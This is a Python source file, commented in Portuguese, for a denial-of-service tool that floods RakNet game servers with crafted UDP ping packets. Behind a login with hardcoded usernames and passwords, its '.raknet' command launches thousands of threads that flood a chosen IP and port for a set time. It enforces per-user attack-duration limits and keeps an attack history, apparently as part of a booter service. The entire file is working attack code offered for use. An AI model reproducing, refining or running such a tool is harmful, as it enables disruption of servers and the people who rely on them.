import socket
import threading
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor

# Configuración avanzada de RakNetHex
MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

# Cores para o terminal
AMARELO = '\033[33m'
BRANCO = '\033[37m'
VERDE = '\033[32m'
RESET = '\033[0m'

# Armazenar ataques realizados para o usuário apsx
historico_apsx = []

# Função para mostrar o banner
def print_banner():
    """Exibir o banner no formato solicitado"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{AMARELO}::: ::::::::: :::::::: ::: :::")
    print(f"  :+: :+: :+: :+: :+: :+: :+: :+: :+:{RESET}")
    print(f" {AMARELO} +:+ +:+ +:+ +:+ +:+ +:+ +:+ {RESET}")
    print(f"{AMARELO}  +#++:++#++: +#++:++#+ +#++:++#++ +#++:+ {RESET}")
    print(f" +#+  +#+  +#+  +#+  +#+  +#+ {RESET}")
    print(f"  #+#  #+#  #+#  #+#  #+#  #+# {RESET}")
    print(f"   ###  ###  ########  ###  ###  {RESET}")
    print(f"\n{BRANCO}ES HORA DEL SHOW!{RESET}")
    print(f"{BRANCO}dev: @apsx{RESET}")
    print(f"{BRANCO}power: Apsx Services{RESET}")
    print(f"{BRANCO}.raknet <ip> <port> <time>{RESET}")

# Sistema de login com validação de usuários
def login():
    """Solicitar nome de usuário e senha"""
    usuarios = {
        'apsx': 'apsxnew',
        'zky': 'zky'
    }
    
    while True:
        username = input("usuário: ").strip()
        password = input("senha: ").strip()

        if username in usuarios and usuarios[username] == password:
            print("\nLogin bem-sucedido!\n")
            return username
        else:
            print("Usuário ou senha incorretos. Tente novamente.\n")

def spoof_guid():
    return random.getrandbits(64).to_bytes(8, 'big')

def spoof_ip():
    """Spoofing de IP aleatória"""
    return bytes(random.randint(1, 254) for _ in range(4))

def raknet_hex_packet(ip, port):
    """Gerar um pacote mais robusto com RakNet Hex"""
    return (
        b'\x05' +                # Tipo de mensagem (0x05, Ping)
        MAGIC +                  # ID de magia
        spoof_guid() +           # GUID aleatório
        spoof_ip() +             # IP falso
        b'\x00\x00' +            # Configuração final
        random.randbytes(20) +   # Bytes aleatórios para maior engano
        port.to_bytes(2, 'big')  # Porta em formato big-endian
    )

def raknethex_flood(ip, port, tempo, metodo, event):
    """Executar o ataque RakNet Hex com Spoofing"""
    addr = (ip, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Habilitar broadcast
    end = time.time() + tempo
    while time.time() < end:
        try:
            for _ in range(500):  # Aumentar o número de pacotes enviados por iteração
                sock.sendto(raknet_hex_packet(ip, port), addr)
        except:
            pass
    event.set()  # Definir o evento quando o ataque estiver completo
    if metodo == "raknethex":
        historico_apsx.append(f"IP: {ip}, Porta: {port}, Método: {metodo}, Tempo: {tempo}s")

def start_attack(ip, port, tempo, username, metodo="raknethex", threads=5000):
    """Iniciar o ataque com um número elevado de threads e controle de PPS"""
    if username == "zky" and tempo > 120:
        print("Erro: O usuário zky pode realizar ataques com no máximo 120 segundos.")
        return
    if username == "apsx" and tempo > 300:
        print("Erro: O usuário apsx pode realizar ataques com no máximo 300 segundos.")
        return
    
    print(f"\n{VERDE}[+] Ataque {metodo} ENVIADO -> {ip}:{port} durante {tempo}s com {threads} threads{RESET}")
    
    # Criar um evento para sinalizar o fim do ataque
    event = threading.Event()
    
    # Usando ThreadPoolExecutor para lidar com os threads de forma mais eficiente
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(raknethex_flood, ip, port, tempo, metodo, event)
    
    event.wait()  # Esperar o ataque ser finalizado
    print(f"{VERDE}Ataque completo!{RESET}")

def mostrar_info_apsx():
    """Mostrar histórico de ataques para o usuário apsx"""
    if not historico_apsx:
        print("Nenhum ataque realizado ainda.\n")
    else:
        print("Histórico de ataques realizados:")
        for ataque in historico_apsx:
            print(f"  - {ataque}")
        print()

def main():
    """Interface de comando para iniciar o ataque"""
    username = login()  # Solicitar login antes de continuar
    
    print_banner()  # Mostrar banner após login
    
    while True:
        comando = input(f"{VERDE}[{username}@lost]{RESET} >> ").strip()
        if comando.startswith(".raknet"):
            try:
                _, ip, port, tempo = comando.split()
                start_attack(ip, int(port), int(tempo), username)
                
                # Após o ataque, perguntar se deseja realizar outro
                while True:
                    resposta = input("Deseja realizar outro ataque? (s/n): ").strip().lower()
                    if resposta == 's':
                        print("Aguardando o fim do ataque anterior...")
                        break  # Esperar o próximo ataque
                    elif resposta == 'n':
                        print(f"{VERDE}Ataque finalizado!{RESET}")
                        break  # Sair do loop
                    else:
                        print("Resposta inválida, por favor insira 's' ou 'n'.")
            
            except ValueError:
                print("Uso correto: .raknet <ip> <port> <tempo>")
        elif comando == ".info" and username == "apsx":
            mostrar_info_apsx()
        else:
            print("Comando não reconhecido")

if __name__ == "__main__":
    if os.name != "nt" and os.geteuid() != 0:
        print("[!] Execute como root para obter o melhor desempenho.")
    main()
